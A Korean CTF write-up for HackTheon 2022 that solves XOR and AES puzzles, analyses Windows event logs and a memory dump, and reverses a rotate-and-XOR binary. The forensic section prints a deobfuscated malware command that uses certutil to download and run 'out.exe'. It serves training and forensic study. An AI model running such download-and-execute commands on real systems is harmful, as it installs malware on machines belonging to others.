---
title: "HackTheon 2022 Writeup"
description: "HackTheon 2022 Writeup"
author: sean9892
categories: [CTF,writeup,HackTheon]
tag: [CTF,writeup]
math: true
mermaid: false
---

![rank](/img/2022-hacktheon/rank.png)

8월 11일 오늘, 세종에서 진행된 HackTheon에 KaisTheon 팀으로 참가하여 4등으로 대회를 마무리하였다. Crypto task가 매우 쉬웠기 때문에 Crypto 2문제, Forensic 2문제, Reversing 1문제를 맡아 해결하였다.

---

### CRYPTO1 - 암호의 기초 1

키 길이가 7인 XOR 암호의 주어진 암호문을 복호화하는 문제이다. XOR 암호는 알려진 평문을 통해 키를 확보할 수 있으므로 알려진 flag의 prefix인 apollob를 이용하여 키를 복원한다.

```python
import base64
c = base64.b64decode("FQAWHg8KBg8TCwsTEQtGQVRfEQocWQIWCk5IBwYJCQYMV1UJ")
l=[]
for x,y in zip(b"apollob",c):
    l.append(x^^y)
for _,x in enumerate(c):
    print(chr(x^^l[_%7]),end="")
# apollob{crypto21--rox-rox--crypto21}
```

---

### CRYPTO2 - 암호의 기초 2

text의 길이를 256로 설정할 때, $n=1$이 되어 각 블럭의 키 공간의 크기가 256으로 줄어든다. 이 점을 이용하여 블럭 별 키를 bruteforce함으로써 원본 key를 복구할 수 있다. 주어진 암호문의 길이는 144인데, 평문의 길이가 같으면 암호문의 길이가 같으므로 1~256 길이의 text를 로컬에서 임의의 키로 암호화하여 암호문의 길이를 보는 과정을 통해 평문의 블럭 수가 5임을 추론할 수 있다. 이를 이용하여 길이 32 단위로 암호문을 끊어주고, 블럭별로 키를 사용하여 복호화하면 flag를 취득할 수 있다.

```python
from minipwn import *
from base64 import b64decode as dec, b64encode as enc

r = remote("apse2021.cstec.kr",5334)
r.recvuntil(b":> ")
r.sendline(b"A"*256)
rcv = eval(r.recvuntil(b"\n").strip().decode()).decode()
c = dec(rcv)

l = [c[i:i+32]for i in range(0,512,32)]

# Key Recovering
from Crypto.Cipher import AES
BS = 16
padd = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
keys = []
for x in l[:-1]:
    for i in range(256):
        d = AES.new(padd(chr(i).encode()),AES.MODE_ECB).decrypt(x)
        if d == padd(b"A"*16):
            print(i)
            keys.append(chr(i))
            
cc = dec("Bdpr6Ki/1lQ75/ph4N7MPHKLU8jTZ0w2vWdJy0LJsFkrGO5VMcBPHBaeS9TeNaCqgTOcltg5gXkSLUxmdvjS1DaBiQjxILplmzakD5fYB7j1QOIIjxtC1Jqu5J0dMT4Cl8X0dh08e2Ror2I8xzgzMOehEo0A5UL6LWYiDeWSk8bmtboESx/qqiJDKo8wi77E")
ll=[cc[i:i+32]for i in range(0,144,32)]

# Key Dividing
n=3
rkeys = [key[i * n:(i + 1) * n] for i in range((len(key) + n - 1) // n )] 

for x,y in zip(ll,rkeys):
    print(AES.new(padd(y.encode()),AES.MODE_ECB).decrypt(x))
    
# b'Apollob{2b480551\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'
# b'edd7316072a593f7\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'
# b'459e4e77e45bc591\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'
# b'8f49a229f9673139\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'
# b'12f5224f}\x07\x07\x07\x07\x07\x07\x07'
# Apollob{2b480551edd7316072a593f7459e4e77e45bc5918f49a229f967313912f5224f}
```

---

### FORENSIC1 - 특별한 이벤트

![events-log](/img/2022-hacktheon/forensic1-events.png)

gigasheet 혹은 윈도우 내장의 evtx viewer를 이용하여 기록된 이벤트를 확인하면 EVENTID가 비정상적이라는 사실을 확인할 수 있다. 여기서는 어떠한 정보를 얻을 수 없을 것이므로, 다른 정보를 확인한다.

이때 EVENTRECORDID=832, EVENTRECORDID=833인 두 이벤트의 EVENTDATA/COMMANDLINE 항목을 살펴보면 난독화된 batch command를 확인할 수 있다. 이를 파이썬으로 파싱하여 대입하면 아래의 정보를 확인할 수 있다.

[파싱된 변수의 값 대입 코드의 일부(Python)]
```
lllllIIllI="0"
IlIllIIIll="1"
lIIIllIlll="2"
lIlIlIIIll="3"
IlllllllII="4"
IlIlIlIIII="5"
llIllIIIlI="6"
lllIIIIIll="7"
lIIlIllIll="8"
IIllllIlll="9"
lllIIlIlII=":"
lllIIlllII=";"
lllIIlllII="="
lllllIlIII="?"
```
출력으로 다음을 얻는다.

```
certutil -urlcache -f httplddyou.know.i.don.t.l1k3.m4lw4r3.rea.lyd out.exe 
 out.exe 
 apollob{a95ac71463fc529219a69b0d25cf4a66021d10023f7c8c9fe155334a1a4bb4774bd86b69cf482ddf7272e7669bc9b182e4de0ec0968d418dccce8fbb4dfeaa5dbdd42fab526be0cd357d}
```

---

### FORENSIC2 - 숨은 그림 찾기

volatility3를 활용하여 memory 파일에서 프로세스의 목록을 확인한 후 remote desktop과 관련된 프로세스의 dump를 딴 후, GIMP에서 오프셋을 조정하여 이미지를 읽으면 flag를 찾을 수 있다.

```
vol -f ./CCE_forensic.mem windows.info
vol -f ./CCE_forensic.mem windows.pslist
vol -f ./CCE_forensic.mem windows.memmap --pid 5880 --dump
```

![flag](/img/2022-hacktheon/forensic2-flag.png)

---

### REVERSING1 - 세종시에 오신 것을 환영합니다.

주어진 실행파일을 디컴파일하여 코드를 확인하면, 가장 관건이 되는 코드가 ROR, ROL, XOR 연산이 섞여있는 부분의 코드이다. 여기서 XOR은 bitwise operation이며 ROR, ROL의 수가 같으므로 최종적으로 이 복잡한 연산의 input과 output의 XOR값은 input과 무관하게 상수임을 알 수 있다. 따라서 flag를 얻기 위한 output에 input과의 XOR값을 XOR하여 그 output을 생산하는 input을 만들 수 있다.

그러한 input은 아래의 15개 수이다. 각각의 수는 16진법으로 표현하여 작성하였다.

```
7e81807e0101817e
ff8080ff808080ff
ff08080808088878
3c4242424242423c
81c1a19189858381
38448080808f463a
0810102010101008
8181818199a5c381
ff8080ff808080ff
80808080808080ff
3e4180808080413e
3c4242424242423c
81c3a59981818181
ff8080ff808080ff
1008080408080810
```

이러한 값을 관찰할 때, 수가 총 15개이고 flag 길이가 15이므로 각 수가 하나의 문자에 대응됨을 추측할 수 있다. 각 수의 각 바이트를 2진법으로 표현하여 각각 그리면 다음과 같이 표현되어 flag를 읽을 수 있다. (X = 1, _ = 0)

```
_XXXXXX_
X______X
X_______
_XXXXXX_
_______X
_______X
X______X
_XXXXXX_
​
XXXXXXXX
X_______
X_______
XXXXXXXX
X_______
X_______
X_______
XXXXXXXX
​
XXXXXXXX
____X___
____X___
____X___
____X___
____X___
X___X___
_XXXX___
​
__XXXX__
_X____X_
_X____X_
_X____X_
_X____X_
_X____X_
_X____X_
__XXXX__
​
X______X
XX_____X
X_X____X
X__X___X
X___X__X
X____X_X
X_____XX
X______X
​
__XXX___
_X___X__
X_______
X_______
X_______
X___XXXX
_X___XX_
__XXX_X_
​
____X___
___X____
___X____
__X_____
___X____
___X____
___X____
____X___
​
X______X
X______X
X______X
X______X
X__XX__X
X_X__X_X
XX____XX
X______X
​
XXXXXXXX
X_______
X_______
XXXXXXXX
X_______
X_______
X_______
XXXXXXXX
​
X_______
X_______
X_______
X_______
X_______
X_______
X_______
XXXXXXXX
​
__XXXXX_
_X_____X
X_______
X_______
X_______
X_______
_X_____X
__XXXXX_
​
__XXXX__
_X____X_
_X____X_
_X____X_
_X____X_
_X____X_
_X____X_
__XXXX__
​
X______X
XX____XX
X_X__X_X
X__XX__X
X______X
X______X
X______X
X______X
​
XXXXXXXX
X_______
X_______
XXXXXXXX
X_______
X_______
X_______
XXXXXXXX
​
___X____
____X___
____X___
_____X__
____X___
____X___
____X___
___X____
```

---

(추가. 2025.09.12.)

대회 당시에는 문제 구성이나 대회 운영과 관련하여 불만이 많았던 것으로 기억한다. 문제를 풀고 보면 타 대회의 flag prefix가 그대로 나온다거나, 문제 난이도가 너무 쉽다거나...

지금 와서 생각해보면, 핵테온은 국내 정부기관에서 운영하는 CTF 대회 중 업무가 정보보안과 관련되지 않은 부서가 운영하는 최초의 대회였으므로 초회 대회부터 매끄럽게 운영되면 더 신기한 것이다.

1,2회는 여러모로 얘기가 나오긴 했다만, 그 이후로는 뉴비 친화적인 정부 주관 CTF 대회라는 점에서 나름의 입지가 확고한 것 같다.

특히 CTF 대회의 문제가 (CP 대회와 비교할 때) 장기간 숙련된 유저가 대회 풀에서 빠지는 기간이 다소 길다는 점인데, 이런 류의 뉴비 타게팅이 잘된 대회가 늘어난다는 것은 CTF 환경에 긍정적인 방향인 것 같다.

GoN에서도 해킹에 새로 입문하는 뉴비 후배들이 출발점 삼아 참가하는 대회인 만큼, 더 크고 더 멋진 대회로 성장했으면 한다.